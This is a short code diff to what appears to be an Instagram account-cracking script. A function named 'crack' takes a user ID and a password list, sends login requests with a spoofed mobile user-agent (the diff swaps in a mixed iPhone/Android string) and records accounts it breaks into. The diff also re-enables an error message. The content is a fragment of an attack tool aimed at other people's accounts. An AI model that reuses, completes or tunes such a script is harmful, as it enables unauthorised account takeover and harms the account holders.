@@ -122,7 +122,7 @@ def crack(uid, password_list, total_count):
             'x-ig-www-claim': 'hmac.AR3mzTXmWJQaei0IjdtQkJIZZIkfif5qOU0tUpKo_5EceiMR',
             'sec-ch-ua-mobile': '?1',
             'x-instagram-ajax': '1010361788',
-            'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
+            'user-agent': 'Instagram 320.0.0.40.101 (iPhone14,5; iOS 17_1; en_US; scale=3.00; 1170x2532) Android 31 Xiaomi RedmiNote10',
             'viewport-width': '421',
             'content-type': 'application/x-www-form-urlencoded',
             'accept': '*/*',
@@ -175,7 +175,7 @@ def crack(uid, password_list, total_count):
                 cps.append(uid)
                 continue
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
                 
     except requests.exceptions.Timeout:
